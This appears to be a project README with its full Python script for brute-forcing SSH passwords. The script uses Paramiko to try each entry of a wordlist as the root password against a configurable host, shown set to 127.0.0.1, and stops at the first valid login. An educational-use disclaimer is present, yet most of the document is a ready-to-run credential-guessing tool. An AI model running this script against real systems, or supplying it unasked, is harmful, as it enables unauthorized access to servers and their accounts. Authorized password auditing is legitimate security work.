ssh-bruteforce/
│── README.md
│── ssh-bruteforce.py
│── ssh-common-password.txt   # (your password list file)
# SSH Brute Force Password Testing Tool

This project demonstrates how to automate SSH login attempts using Python and the **Paramiko** library.  
It reads a list of common passwords from a file and tries each one against a target host.  
The script reports whether a valid password is found or not.

⚠️ **Disclaimer**  
This project is intended **only for educational purposes** and for testing against systems you own or have explicit permission to audit.  
Unauthorized use against systems you don’t control is illegal and unethical.

---

## Features
- Iterates through a list of passwords from a text file.
- Attempts SSH login using each password.
- Reports successful and failed attempts.
- Stops execution once a valid password is found.

---

## Requirements
- Python 3.x
- [Paramiko](https://www.paramiko.org/) library
- A password list file (`ssh-common-password.txt`)

Install dependencies:
```bash
pip install paramiko pwntools

---

## 🛠 ssh-bruteforce.py
```python
from pwn import *
import paramiko

# Target configuration
host = "127.0.0.1"
username = "root"
attempts = 0

# Open password file and iterate through each password
with open("ssh-common-password.txt", "r") as password_file:
    for password in password_file:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            
            # Initialize SSH client
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Attempt connection
            ssh_client.connect(hostname=host, username=username, password=password, timeout=1)
            
            print("[>] Valid password found: '{}'!".format(password))
            ssh_client.close()
            break  # Exit loop once valid password is found
        
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
            attempts += 1
